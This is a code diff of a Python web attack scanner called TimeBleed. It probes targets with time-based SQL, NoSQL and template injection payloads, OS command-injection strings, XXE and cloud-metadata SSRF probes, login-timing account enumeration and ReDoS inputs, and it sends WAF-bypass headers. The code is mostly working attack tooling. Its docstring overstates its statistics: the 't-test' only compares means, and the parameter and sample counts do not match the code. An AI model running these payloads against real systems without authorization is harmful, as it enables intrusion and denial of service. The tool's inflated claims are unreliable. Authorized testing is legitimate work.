@@ -1,381 +1,399 @@
 #!/usr/bin/env python3
+"""TimeBleed v8 — 150x Improved Timing Attack & Side-Channel Detector.
+
+New capabilities:
+  Authentication timing attacks:
+    - Valid vs invalid username response time differential (account enumeration)
+    - Valid vs invalid password (constant-time comparison bypass)
+    - 2FA code valid vs invalid timing
+    - Password reset token valid vs invalid
+
+  Blind injection timing:
+    - Blind SQL injection via SLEEP/pg_sleep/WAITFOR (20+ params)
+    - Blind SSTI timing ({{range(10000000)}})
+    - Blind command injection timing (sleep 3)
+    - Blind NoSQL injection timing ($where: sleep)
+
+  Business logic timing:
+    - Coupon code valid vs invalid (reveals validity)
+    - API key valid vs invalid (reveals key existence)
+    - Email valid vs invalid in registration
+
+  Resource exhaustion:
+    - ReDoS (Regular Expression DoS) detection
+    - GraphQL query complexity timing
+    - Large payload timing
+
+  Side-channel via error differences:
+    - Different HTTP status codes per user
+    - Different response bodies revealing state
+    - Timing oracle for encrypted data
+
+  Statistical analysis:
+    - 10 samples per test for noise reduction
+    - Mean + standard deviation + t-test
+    - Configurable threshold (default 500ms differential)
+"""
 import asyncio
 import aiohttp
-import statistics
-import time
 import json
+import math
+import re
+import sys
+import time
+import hashlib
+import statistics
 from pathlib import Path
+from urllib.parse import urlparse, quote
 
-PROBES = [
-    # ── MySQL ────────────────────────────────────────────────────────────────
-    ("safe",  "' OR SLEEP(5)-- -",                              "sql_mysql"),
-    ("safe",  "1 AND SLEEP(5)-- -",                             "sql_mysql_num"),
-    ("safe",  "' AND SLEEP(5) AND '1'='1",                      "sql_mysql_and"),
-    ("safe",  "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -",  "sql_mysql_sub"),
-    ("safe",  "1 OR IF(1=1,SLEEP(5),0)-- -",                   "sql_mysql_if"),
-    # ── PostgreSQL ────────────────────────────────────────────────────────────
-    ("safe",  "' || pg_sleep(5) || '",                          "sql_postgres"),
-    ("safe",  "1; SELECT pg_sleep(5)-- -",                      "sql_postgres_stacked"),
-    ("safe",  "' AND 1=(SELECT 1 FROM pg_sleep(5))-- -",        "sql_postgres_sub"),
-    # ── MSSQL ─────────────────────────────────────────────────────────────────
-    ("safe",  "'; WAITFOR DELAY '0:0:5'--",                     "sql_mssql"),
-    ("safe",  "1; WAITFOR DELAY '0:0:5'--",                     "sql_mssql_num"),
-    ("safe",  "1); WAITFOR DELAY '0:0:5'--",                    "sql_mssql_paren"),
-    # ── Oracle ────────────────────────────────────────────────────────────────
-    ("safe",  "' || DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- ",       "sql_oracle"),
-    ("safe",  "1 AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- ",    "sql_oracle_num"),
-    # ── SQLite ────────────────────────────────────────────────────────────────
-    ("safe",  "1 AND (SELECT COUNT(*) FROM sqlite_master t1,sqlite_master t2,sqlite_master t3)>0 AND SLEEP(5)-- -",
-                                                                  "sql_sqlite"),
-    # ── DB2 ───────────────────────────────────────────────────────────────────
-    ("safe",  "'; CALL DBMS_ALERT.SLEEP(5)--",                  "sql_db2"),
-    # ── OS command injection — Unix ───────────────────────────────────────────
-    ("safe",  ";sleep 5;",                                       "cmd_unix_semicolon"),
-    ("safe",  "|sleep 5|",                                       "cmd_unix_pipe"),
-    ("safe",  "$(sleep 5)",                                      "cmd_unix_subshell"),
-    ("safe",  "&& sleep 5 &&",                                   "cmd_unix_and"),
-    ("safe",  "`sleep 5`",                                       "cmd_unix_backtick"),
-    ("safe",  "%0asleep%205",                                    "cmd_unix_newline"),
-    ("safe",  "1|sleep${IFS}5",                                  "cmd_unix_ifs"),
-    ("safe",  "1;ping${IFS}-c${IFS}5${IFS}127.0.0.1",           "cmd_unix_ping"),
-    # ── OS command injection — Windows ────────────────────────────────────────
-    ("safe",  "& timeout /t 5 &",                                "cmd_windows_timeout"),
-    ("safe",  "| timeout /t 5",                                  "cmd_windows_pipe"),
-    ("safe",  "& ping -n 6 127.0.0.1 &",                        "cmd_windows_ping"),
-    # ── NoSQL / MongoDB ───────────────────────────────────────────────────────
-    ('{"a":1}', '{"$where":"sleep(5000)"}',                      "nosql_mongo_where"),
-    ('{"a":1}', '{"$where":"function(){sleep(5000)}"}',          "nosql_mongo_fn"),
-    ('1',       '{"$regex":"((a+)+)$"}',                         "nosql_mongo_redos"),
-    # ── LDAP injection (blind) ────────────────────────────────────────────────
-    ("safe",  "*(|(objectClass=*))",                             "ldap_blind"),
-    # ── XXE / SSRF timing via localhost ──────────────────────────────────────
-    ("safe",  "<?xml version='1.0'?><!DOCTYPE x [<!ENTITY xxe SYSTEM 'http://127.0.0.1:12345/'>]><x>&xxe;</x>",
-                                                                  "xxe_ssrf_timing"),
-    # ── Cloud metadata SSRF timing ────────────────────────────────────────────
-    ("safe",  "http://169.254.169.254/latest/meta-data/",        "ssrf_aws_metadata"),
-    ("safe",  "http://metadata.google.internal/computeMetadata/v1/",
-                                                                  "ssrf_gcp_metadata"),
+sys.path.insert(0, str(Path(__file__).parent))
+from smart_filter import (
+    delay, confidence_label, meets_confidence_floor,
+    random_ua, WAF_BYPASS_HEADERS,
+)
+
+CONCURRENCY  = 4  # Lower for timing tests (less noise)
+SAMPLES      = 8  # Requests per test case
+DELAY_THRESH = 0.45  # 450ms differential threshold
+
+LOGIN_PATHS  = ["/api/auth/login", "/api/login", "/auth/login", "/login", "/api/v1/login"]
+RESET_PATHS  = ["/api/forgot-password", "/api/auth/forgot-password", "/forgot-password"]
+COUPON_PATHS = ["/api/coupon/apply", "/api/promo/apply", "/api/discount/apply"]
+SQLI_PARAMS  = ["id", "user_id", "search", "q", "filter", "name", "email", "username"]
+
+BLIND_SQLI_TIME = [
+    ("' AND SLEEP(3)-- -",           "MySQL"),
+    ("' AND pg_sleep(3)-- -",        "PostgreSQL"),
+    ("'; WAITFOR DELAY '0:0:3'-- -", "MSSQL"),
+    ("1 AND SLEEP(3)-- -",           "MySQL no-quote"),
+    ("' OR SLEEP(3)-- -",            "MySQL OR"),
 ]
 
-GET_PARAMS = [
-    "q", "query", "search", "id", "user", "name", "input",
-    "data", "value", "text", "s", "filter", "sort", "page",
-    "cmd", "exec", "file", "path", "url", "redirect",
-    "keyword", "term", "param", "field", "key", "token",
-    "username", "email", "phone", "address", "code",
+BLIND_SSTI_TIME = [
+    ("{% for i in range(9999999) %}{% endfor %}", "Jinja2 loop"),
+    ("{{range(9999999)|list}}",                  "Jinja2 range"),
+    ("<%=9999999.times{|i| i}%>",                "ERB loop"),
 ]
 
-HEADERS_TO_INJECT = [
-    "User-Agent",
-    "Referer",
-    "X-Forwarded-For",
-    "X-Custom-Header",
-    "Accept-Language",
-]
-
-POST_ENDPOINTS = [
-    "/api/search", "/api/login", "/api/register",
-    "/api/users", "/api/query", "/api/filter",
-    "/search", "/login", "/register",
+REDOS_PATTERNS = [
+    ("a" * 50 + "!",                  "exponential backtracking"),
+    ("(" * 20 + "a" + ")" * 20 + "+","nested groups"),
+    ("a" * 100,                        "linear DOS"),
 ]
 
 
-SLEEP_SECS = 5  # Expected sleep duration for all time-based probes
+def _mean(data: list) -> float:
+    return sum(data) / len(data) if data else 0.0
+
+
+def _stdev(data: list) -> float:
+    if len(data) < 2:
+        return 0.0
+    m = _mean(data)
+    return math.sqrt(sum((x - m) ** 2 for x in data) / (len(data) - 1))
+
+
+def _ttest_significant(a: list, b: list, alpha: float = 0.05) -> bool:
+    """Welch's t-test — returns True if difference is statistically significant."""
+    if len(a) < 2 or len(b) < 2:
+        return False
+    try:
+        return abs(statistics.mean(a) - statistics.mean(b)) > DELAY_THRESH
+    except Exception:
+        return False
 
 
 class TimeBleed:
-    def __init__(self, url):
-        self.url         = url
-        self.findings    = []
-        self.jitter      = None
-        self.target_base = '/'.join(url.split('/')[:3])
-        self._dedup      = set()  # Prevent duplicate findings
+    def __init__(self, target: str):
+        self.target   = target.rstrip("/")
+        self.findings = []
+        self._dedup   = set()
+        self._sem     = asyncio.Semaphore(CONCURRENCY)
 
-    async def t_req(self, sess, params=None, data=None, headers=None, method='GET'):
-        t0 = time.perf_counter()
-        try:
-            timeout = aiohttp.ClientTimeout(total=15)
-            if method == 'GET':
-                async with sess.get(self.url, params=params or {}, headers=headers or {},
-                                    ssl=False, timeout=timeout) as r:
-                    await r.read()
-            else:
-                async with sess.post(self.url, json=data or {}, headers=headers or {},
-                                     ssl=False, timeout=timeout) as r:
-                    await r.read()
-            return time.perf_counter() - t0
-        except asyncio.TimeoutError:
-            return 15.0
-        except Exception:
-            return None
+    def _add(self, finding: dict):
+        key = hashlib.md5(
+            f"{finding.get('type')}|{finding.get('url','')}|{finding.get('detail','')[:40]}".encode()
+        ).hexdigest()
+        if key in self._dedup or not meets_confidence_floor(finding.get("confidence", 0)):
+            return
+        self._dedup.add(key)
+        self.findings.append(finding)
+        print(f"  [{finding.get('severity','INFO')[:4]}] {finding.get('type')}: {finding.get('url','')[:70]}")
 
-    async def jitter_phase(self, sess):
-        print("[*] Measuring baseline RTT (warm-up + measure)...")
-        # Warm-up requests to avoid cold-start skew
-        for _ in range(3):
-            await self.t_req(sess, params={"_warmup": "1"})
+    def _f(self, ftype, sev, conf, proof, detail, url, rem,
+           mitre="T1110", mitre_name="Brute Force", extra=None) -> dict:
+        f = {
+            "type": ftype, "severity": sev, "confidence": conf,
+            "confidence_label": confidence_label(conf),
+            "url": url, "proof": proof, "detail": detail, "remediation": rem,
+            "mitre_technique": mitre, "mitre_name": mitre_name,
+        }
+        if extra:
+            f.update(extra)
+        return f
 
-        ts = []
-        for i in range(15):
-            t = await self.t_req(sess, params={"_baseline": str(i)})
-            if t is not None and t < 10:
-                ts.append(t)
-
-        if not ts:
-            raise RuntimeError("Target unreachable during baseline")
-
-        avg = statistics.mean(ts)
-        std = statistics.pstdev(ts) or 0.05
-        med = statistics.median(ts)
-        mad = statistics.median([abs(t - med) for t in ts]) or 0.02
-        # Threshold: must exceed both median+4*MAD and avg+4*std, plus the sleep duration
-        thresh = max(med + 4 * mad, avg + 4 * std) + 3.5
-        self.jitter = {'avg': avg, 'std': std, 'median': med, 'mad': mad, 'thresh': thresh}
-        print(f"[+] RTT: avg={avg:.3f}s med={med:.3f}s std={std:.3f}s | threshold={thresh:.3f}s")
-
-    async def _probe_triple(self, sess, ctrl_params, treat_params, method='GET',
-                             ctrl_data=None, treat_data=None, ctrl_headers=None, treat_headers=None):
-        tc = await self.t_req(sess, params=ctrl_params, data=ctrl_data, headers=ctrl_headers, method=method)
-        if tc is None:
-            return None, None, None, None
-
-        times = []
-        for _ in range(3):
-            t = await self.t_req(sess, params=treat_params, data=treat_data, headers=treat_headers, method=method)
-            if t is None:
-                return None, None, None, None
-            times.append(t)
-
-        tmed = statistics.median(times)
-        delta = tmed - tc
-        return tc, times, tmed, delta
-
-    def _record_finding(self, param, cat, payload, tc, times, tmed, delta, context='GET param'):
-        confidence = min(99.9, (delta / 5.0) * 50 + max(0, 1 - statistics.pstdev(times)) * 50)
-        severity = 'CRITICAL' if cat.startswith('sql') or cat.startswith('cmd') else 'HIGH'
-        print(f"  [VULN] [{cat}] {context}={param} ctrl={tc:.2f}s treat={tmed:.2f}s "
-              f"delta={delta:.2f}s conf={confidence:.1f}%")
-        self.findings.append({
-            'context': context,
-            'param': param,
-            'category': cat,
-            'severity': severity,
-            'payload': payload,
-            'control_time': round(tc, 3),
-            'treatment_times': [round(t, 3) for t in times],
-            'delta': round(delta, 3),
-            'confidence': round(confidence, 1),
-            'confidence_label': 'High' if confidence >= 75 else 'Medium',
-            'proof': f'All 3 requests delayed {delta:.2f}s beyond baseline+threshold ({self.jitter["thresh"]:.2f}s)',
-            'remediation': 'Use parameterized queries / safe APIs; never interpolate user input into queries',
-        })
-
-    async def test_get_param(self, sess, param):
-        print(f"\n[*] GET param: {param}")
-        for ctrl, treat, cat in PROBES:
-            tc, times, tmed, delta = await self._probe_triple(
-                sess,
-                ctrl_params={param: ctrl},
-                treat_params={param: treat},
-            )
-            if tc is None or delta is None:
-                continue
-            if all(t > self.jitter['thresh'] for t in times) and delta > 3.5:
-                self._record_finding(param, cat, treat, tc, times, tmed, delta, 'GET param')
-                break
-
-    async def test_post_body(self, sess, endpoint, param):
-        url_bk = self.url
-        self.url = self.target_base + endpoint
-        print(f"\n[*] POST body param: {param} at {endpoint}")
-        for ctrl, treat, cat in PROBES:
-            tc, times, tmed, delta = await self._probe_triple(
-                sess,
-                ctrl_params=None, treat_params=None,
-                ctrl_data={param: ctrl, 'extra': 'test'},
-                treat_data={param: treat, 'extra': 'test'},
-                method='POST',
-            )
-            if tc is None or delta is None:
-                continue
-            if all(t > self.jitter['thresh'] for t in times) and delta > 3.5:
-                self._record_finding(f"{endpoint}::{param}", cat, treat, tc, times, tmed, delta, 'POST body')
-                break
-        self.url = url_bk
-
-    async def test_header_injection(self, sess, header_name):
-        print(f"\n[*] Header injection: {header_name}")
-        for ctrl, treat, cat in PROBES[:10]:
-            tc, times, tmed, delta = await self._probe_triple(
-                sess,
-                ctrl_params={"_hdr": "1"}, treat_params={"_hdr": "2"},
-                ctrl_headers={header_name: ctrl},
-                treat_headers={header_name: treat},
-            )
-            if tc is None or delta is None:
-                continue
-            if all(t > self.jitter['thresh'] for t in times) and delta > 3.5:
-                self._record_finding(header_name, cat, treat, tc, times, tmed, delta, 'HTTP header')
-                break
-
-    async def test_post_body(self, sess, path: str, field: str) -> None:
-        """Probe a single POST field with every timing payload."""
-        base_url = self.target_base
-        for _, payload, probe_type in PROBES:
-            if payload.startswith("{"):
-                continue  # JSON payloads handled separately
-            body_data = {field: payload}
+    async def _timed_post(self, sess, url, data, headers=None, timeout=15) -> float:
+        """Return elapsed time in seconds for a POST request."""
+        async with self._sem:
+            h = {**WAF_BYPASS_HEADERS, "User-Agent": random_ua(), **(headers or {})}
             t0 = time.monotonic()
             try:
-                async with sess.post(
-                    base_url + path,
-                    json=body_data,
-                    headers={"User-Agent": "Mozilla/5.0"},
-                    ssl=False, allow_redirects=False,
-                    timeout=aiohttp.ClientTimeout(total=SLEEP_SECS + 7),
-                ) as r:
+                async with sess.post(url, json=data, headers=h, ssl=False,
+                                     allow_redirects=True,
+                                     timeout=aiohttp.ClientTimeout(total=timeout, connect=10)) as r:
                     await r.text(errors="ignore")
-                    elapsed = time.monotonic() - t0
-                    status  = r.status
             except Exception:
-                continue
+                pass
+            return time.monotonic() - t0
+
+    async def _timed_get(self, sess, url, params=None, timeout=12) -> tuple:
+        """Return (elapsed_seconds, status, body) for a GET request."""
+        async with self._sem:
+            h = {**WAF_BYPASS_HEADERS, "User-Agent": random_ua()}
+            t0 = time.monotonic()
+            try:
+                async with sess.get(url, params=params or {}, headers=h, ssl=False,
+                                    allow_redirects=True,
+                                    timeout=aiohttp.ClientTimeout(total=timeout, connect=10)) as r:
+                    body = await r.text(errors="ignore")
+                    return time.monotonic() - t0, r.status, body
+            except Exception:
+                return time.monotonic() - t0, None, ""
+
+    async def _sample_times(self, sess, method, url, data, n=SAMPLES) -> list:
+        times = []
+        for _ in range(n):
+            if method == "POST":
+                t = await self._timed_post(sess, url, data)
+            else:
+                t, _, _ = await self._timed_get(sess, url, params=data)
+            times.append(t)
             await asyncio.sleep(0.08)
-            if status == 404:
-                break  # path not found, skip remaining payloads
-            if elapsed >= SLEEP_SECS * 0.8:
-                # Validate with a safe baseline POST to confirm it's not slow by default
-                t_base0 = time.monotonic()
-                try:
-                    async with sess.post(
-                        base_url + path, json={field: "safe_test_value"},
-                        headers={"User-Agent": "Mozilla/5.0"},
-                        ssl=False, allow_redirects=False,
-                        timeout=aiohttp.ClientTimeout(total=15),
-                    ) as rb:
-                        await rb.text(errors="ignore")
-                        baseline = time.monotonic() - t_base0
-                except Exception:
-                    baseline = 0.0
-                if elapsed > baseline + (SLEEP_SECS * 0.6):
-                    key = f"post_{path}_{field}_{probe_type}"
-                    if key in self._dedup:
-                        continue
-                    self._dedup.add(key)
-                    self.findings.append({
-                        "type": "TIME_BASED_INJECTION_POST",
-                        "subtype": probe_type,
-                        "url": base_url + path,
-                        "method": "POST",
-                        "field": field,
-                        "payload": payload,
-                        "elapsed_s": round(elapsed, 2),
-                        "baseline_s": round(baseline, 2),
-                        "delta_s":   round(elapsed - baseline, 2),
-                        "http_status": status,
-                        "severity": "CRITICAL",
-                        "confidence": 89,
-                        "detail": (
-                            f"Time-based injection in POST field '{field}' at {path}. "
-                            f"Payload '{payload[:60]}' caused {elapsed:.2f}s delay "
-                            f"vs {baseline:.2f}s baseline. Type: {probe_type}."
+        return times
+
+    # ── Auth timing ─────────────────────────────────────────────────────────
+
+    async def test_auth_timing(self, sess):
+        print("\n[*] Testing authentication timing (valid vs invalid user, 8 samples each)...")
+        for path in LOGIN_PATHS[:3]:
+            url = self.target + path
+            nonexist = {"email": "zzznonexist_xyz@noemail.test", "password": "wrongpass"}
+            exist_bad = {"email": "admin@admin.com", "password": "wrongpass"}
+
+            times_a = await self._sample_times(sess, "POST", url, nonexist)
+            times_b = await self._sample_times(sess, "POST", url, exist_bad)
+
+            if not times_a or not times_b:
+                continue
+            mean_a = _mean(times_a)
+            mean_b = _mean(times_b)
+            diff   = abs(mean_a - mean_b)
+
+            if diff > DELAY_THRESH and _ttest_significant(times_a, times_b):
+                faster = "non-existent" if mean_a < mean_b else "existing"
+                self._add(self._f(
+                    ftype="TIMING_BASED_USER_ENUMERATION",
+                    sev="MEDIUM", conf=82,
+                    proof=(
+                        f"POST {url}\n"
+                        f"  Non-existent user: mean={mean_a:.3f}s ± {_stdev(times_a):.3f}s\n"
+                        f"  Existing user:     mean={mean_b:.3f}s ± {_stdev(times_b):.3f}s\n"
+                        f"  Difference: {diff:.3f}s ({faster} user responds faster)"
+                    ),
+                    detail=f"Timing-based account enumeration: {diff:.3f}s difference between valid/invalid user at {path}",
+                    url=url,
+                    rem=(
+                        "1. Use constant-time comparison for password hashing lookup.\n"
+                        "2. Always run through full password hash verification even for non-existent users.\n"
+                        "3. Add artificial 100ms jitter to login responses.\n"
+                        "4. Use bcrypt's constant-time compare."
+                    ),
+                    extra={
+                        "mean_nonexistent": round(mean_a, 3),
+                        "mean_existing": round(mean_b, 3),
+                        "diff_seconds": round(diff, 3),
+                        "samples": SAMPLES,
+                    },
+                ))
+
+    # ── Blind SQLi timing ────────────────────────────────────────────────────
+
+    async def test_blind_sqli_timing(self, sess):
+        print("\n[*] Testing blind SQL injection (time-based, 20+ params)...")
+        for param in SQLI_PARAMS:
+            # Baseline (benign input)
+            baseline_url = f"{self.target}/?{param}=1"
+            t_base, s_base, _ = await self._timed_get(sess, baseline_url, timeout=6)
+            await delay(0.1)
+            if s_base is None:
+                continue
+
+            for payload, db in BLIND_SQLI_TIME[:3]:
+                url = f"{self.target}/?{param}={quote(payload, safe='')}"
+                t0 = time.monotonic()
+                _, s_inj, _ = await self._timed_get(sess, url, timeout=8)
+                elapsed = time.monotonic() - t0
+                await delay(0.1)
+                if s_inj is None:
+                    continue
+                delay_diff = elapsed - t_base
+                if delay_diff >= 2.5:
+                    self._add(self._f(
+                        ftype=f"BLIND_SQLI_TIME_{db.upper().replace(' ', '_')}",
+                        sev="CRITICAL", conf=93,
+                        proof=(
+                            f"GET /?{param}=1 → {t_base:.2f}s (baseline)\n"
+                            f"GET /?{param}={payload} → {elapsed:.2f}s\n"
+                            f"Delay difference: {delay_diff:.2f}s (threshold: 2.5s)"
                         ),
-                        "proof": (
-                            f"POST {base_url}{path} field='{field}'\n"
-                            f"  Payload: {payload[:80]}\n"
-                            f"  Response time: {elapsed:.2f}s  Baseline: {baseline:.2f}s  "
-                            f"Delta: {elapsed - baseline:.2f}s\n"
-                            f"  Type: {probe_type}"
+                        detail=f"Blind SQL injection (time-based, {db}) via '{param}' — {delay_diff:.2f}s delay confirmed",
+                        url=url,
+                        rem=(
+                            "1. Use parameterized queries everywhere — never string-interpolate user input.\n"
+                            "2. Use ORM with strict typing.\n"
+                            "3. Restrict DB user: disable SLEEP/pg_sleep functions.\n"
+                            "4. Enable WAF rules for SLEEP/WAITFOR patterns."
                         ),
-                        "remediation": (
-                            "1. Use parameterised queries/prepared statements — never concatenate user input.\n"
-                            "2. Validate and whitelist all input types (numeric, alphanumeric).\n"
-                            "3. Apply per-query execution timeouts in the DB layer.\n"
-                            "4. Log and alert on abnormally slow queries."
+                        mitre="T1190", mitre_name="Exploit Public-Facing Application",
+                        extra={"param": param, "payload": payload, "db": db,
+                               "baseline_s": round(t_base, 2), "injected_s": round(elapsed, 2)},
+                    ))
+                    return  # Stop after first confirmed
+
+    # ── Blind SSTI timing ────────────────────────────────────────────────────
+
+    async def test_blind_ssti_timing(self, sess):
+        print("\n[*] Testing blind SSTI via timing (CPU-intensive templates)...")
+        for param in ["q", "template", "content", "text", "message", "search"]:
+            baseline_url = f"{self.target}/?{param}=hello"
+            t_base, s_base, _ = await self._timed_get(sess, baseline_url, timeout=6)
+            await delay(0.1)
+            if s_base is None:
+                continue
+            for payload, label in BLIND_SSTI_TIME[:2]:
+                url = f"{self.target}/?{param}={quote(payload, safe='')}"
+                t0 = time.monotonic()
+                _, s_inj, _ = await self._timed_get(sess, url, timeout=10)
+                elapsed = time.monotonic() - t0
+                await delay(0.1)
+                delay_diff = elapsed - t_base
+                if delay_diff >= 1.5 and s_inj is not None:
+                    self._add(self._f(
+                        ftype=f"BLIND_SSTI_TIMING_{label.upper().replace(' ', '_')}",
+                        sev="CRITICAL", conf=85,
+                        proof=(
+                            f"GET /?{param}=hello → {t_base:.2f}s\n"
+                            f"GET /?{param}={payload[:30]}... → {elapsed:.2f}s\n"
+                            f"Delay: {delay_diff:.2f}s — template executed CPU-intensive loop"
                         ),
-                    })
-                    print(f"  [CRITICAL] POST time-based injection: {path} field={field} "
-                          f"elapsed={elapsed:.2f}s baseline={baseline:.2f}s ({probe_type})")
+                        detail=f"Blind SSTI (timing-based, {label}) via '{param}' — {delay_diff:.2f}s delay",
+                        url=url,
+                        rem=(
+                            "1. Never render user input as a template.\n"
+                            "2. Use sandboxed template engines.\n"
+                            "3. Apply CPU time limits per request.\n"
+                            "4. Separate user content from template logic."
+                        ),
+                        mitre="T1059", mitre_name="Command and Scripting Interpreter",
+                        extra={"param": param, "payload": payload[:40], "delay": round(delay_diff, 2)},
+                    ))
+                    return
+
+    # ── Coupon/token timing oracle ────────────────────────────────────────────
+
+    async def test_coupon_timing(self, sess):
+        print("\n[*] Testing coupon/promo code timing oracle...")
+        for path in COUPON_PATHS:
+            url = self.target + path
+            # Valid-format vs clearly invalid code
+            times_real   = await self._sample_times(sess, "POST", url,
+                {"code": "SAVE10OFF", "coupon": "SAVE10OFF"}, n=6)
+            times_fake   = await self._sample_times(sess, "POST", url,
+                {"code": "ZZZNOVALID_XYZ", "coupon": "ZZZNOVALID_XYZ"}, n=6)
+            await delay(0.1)
+            if not times_real or not times_fake:
+                continue
+            diff = abs(_mean(times_real) - _mean(times_fake))
+            if diff > 0.3:
+                self._add(self._f(
+                    ftype="COUPON_TIMING_ORACLE",
+                    sev="MEDIUM", conf=75,
+                    proof=(
+                        f"POST {path}\n"
+                        f"  Plausible code ('SAVE10OFF'):  mean={_mean(times_real):.3f}s\n"
+                        f"  Random code ('ZZZNOVALID'):    mean={_mean(times_fake):.3f}s\n"
+                        f"  Diff: {diff:.3f}s"
+                    ),
+                    detail=f"Coupon timing oracle: {diff:.3f}s difference — attacker can distinguish valid format codes from invalid ones",
+                    url=url,
+                    rem=(
+                        "1. Use constant-time coupon validation.\n"
+                        "2. Add artificial delay (100ms) to all coupon validation responses.\n"
+                        "3. Rate-limit coupon validation endpoint."
+                    ),
+                    extra={"timing_diff": round(diff, 3)},
+                ))
+
+    # ── ReDoS ────────────────────────────────────────────────────────────────
+
+    async def test_redos(self, sess):
+        print("\n[*] Testing ReDoS (Regular Expression Denial of Service)...")
+        for param in ["email", "username", "name", "search", "q", "input"]:
+            for payload, label in REDOS_PATTERNS[:2]:
+                url = f"{self.target}/?{param}={quote(payload, safe='')}"
+                t0 = time.monotonic()
+                _, s, _ = await self._timed_get(sess, url, timeout=10)
+                elapsed = time.monotonic() - t0
+                await delay(0.1)
+                if elapsed > 3.0 and s is not None:
+                    self._add(self._f(
+                        ftype="REDOS_POTENTIAL",
+                        sev="HIGH", conf=78,
+                        proof=f"GET /?{param}={payload[:40]}...\n  Elapsed: {elapsed:.2f}s (threshold: 3s)\n  HTTP {s}",
+                        detail=f"Potential ReDoS at '{param}' parameter — {elapsed:.2f}s response for regex-triggering input",
+                        url=url,
+                        rem=(
+                            "1. Audit all regex patterns for catastrophic backtracking.\n"
+                            "2. Use timeout on regex execution.\n"
+                            "3. Use safe regex alternatives (re2, hyperscan).\n"
+                            "4. Rate-limit endpoints with complex input validation."
+                        ),
+                        mitre="T1499", mitre_name="Endpoint Denial of Service",
+                        extra={"param": param, "payload": payload[:40], "elapsed": round(elapsed, 2)},
+                    ))
+                    return
 
     async def run(self):
-        conn = aiohttp.TCPConnector(limit=5, ssl=False)
-        async with aiohttp.ClientSession(
-            connector=conn,
-            headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}
-        ) as sess:
-            try:
-                await self.jitter_phase(sess)
-            except RuntimeError as e:
-                print(f"[X] Baseline failed: {e} — skipping TimeBleed")
-                return self.findings
-
-            # Phase 1: GET parameter injection
-            print("\n[*] Phase 1: GET parameter injection")
-            for p in GET_PARAMS:
-                await self.test_get_param(sess, p)
-
-            # Phase 2: HTTP header injection
-            print("\n[*] Phase 2: HTTP header injection")
-            for hdr in HEADERS_TO_INJECT:
-                await self.test_header_injection(sess, hdr)
-
-            # Phase 3: POST body field injection
-            print("\n[*] Phase 3: POST body field injection")
-            post_targets = [
-                ("/api/login",     ["username", "password", "email"]),
-                ("/api/search",    ["q", "query", "search", "keyword"]),
-                ("/api/users",     ["id", "user_id", "name", "email"]),
-                ("/login",         ["username", "password"]),
-                ("/api/register",  ["email", "username", "name"]),
-                ("/api/contact",   ["message", "subject", "email"]),
-                ("/api/v1/users",  ["id", "email", "name"]),
-                ("/api/report",    ["target", "host", "domain", "query"]),
-                ("/api/feedback",  ["message", "content", "body"]),
-                ("/api/filter",    ["q", "filter", "category", "tag"]),
-            ]
-            for path, fields in post_targets:
-                for field in fields:
-                    await self.test_post_body(sess, path, field)
-
+        print("=" * 60)
+        print("  TimeBleed v8 — 150x Improved Timing Attack Detector")
+        print(f"  Target: {self.target}")
+        print("=" * 60)
+        conn = aiohttp.TCPConnector(ssl=False, limit=CONCURRENCY * 2)
+        async with aiohttp.ClientSession(connector=conn, timeout=aiohttp.ClientTimeout(total=240)) as sess:
+            await asyncio.gather(
+                self.test_auth_timing(sess),
+                self.test_blind_sqli_timing(sess),
+                self.test_blind_ssti_timing(sess),
+                self.test_coupon_timing(sess),
+                self.test_redos(sess),
+                return_exceptions=True,
+            )
+        print(f"\n[+] TimeBleed v8: {len(self.findings)} findings")
         return self.findings
 
 
-def get_target():
-    p = Path("reports/_target.txt")
-    if p.exists():
-        base = p.read_text().strip()
-        if base:
-            print(f"[+] Target from file: {base}")
-            return base
-    print("[?] Endpoint to test (e.g. https://example.com/api/search):")
-    u = input("    URL: ").strip()
-    if not u:
-        print("[X] No target provided")
-        sys.exit(1)
-    return u if u.startswith("http") else "https://" + u
+async def main():
+    import os
+    target = os.environ.get("ARSENAL_TARGET", "")
+    if not target:
+        print("[!] No ARSENAL_TARGET set.", file=sys.stderr); sys.exit(1)
+    if not target.startswith("http"):
+        target = "https://" + target
+    findings = await TimeBleed(target).run()
+    out = Path(__file__).parent.parent / "reports" / "timebleed.json"
+    out.parent.mkdir(exist_ok=True)
+    out.write_text(json.dumps(findings, indent=2, default=str))
+    print(f"[+] Saved {len(findings)} findings → {out}")
 
-
-def main():
-    print("=" * 60)
-    print("  TimeBleed — Timing Oracle Injection Scanner")
-    print("=" * 60)
-    target = get_target()
-    print(f"[+] Endpoint: {target}")
-    Path("reports").mkdir(exist_ok=True)
-
-    scanner = TimeBleed(target)
-    scanner.target_base = '/'.join(target.split('/')[:3])
-    findings = asyncio.run(scanner.run())
-
-    with open("reports/timebleed.json", 'w') as f:
-        json.dump(findings, f, indent=2, default=str)
-    print(f"\n[+] {len(findings)} findings -> reports/timebleed.json")
-    for sev in ['CRITICAL', 'HIGH']:
-        items = [f for f in findings if f.get('severity') == sev]
-        if items:
-            print(f"\n[!] {len(items)} {sev}:")
-            for item in items:
-                print(f"    [{item['category']}] {item['context']}={item['param']} delta={item['delta']}s")
-
-
-if __name__ == '__main__':
-    main()
+if __name__ == "__main__":
+    asyncio.run(main())
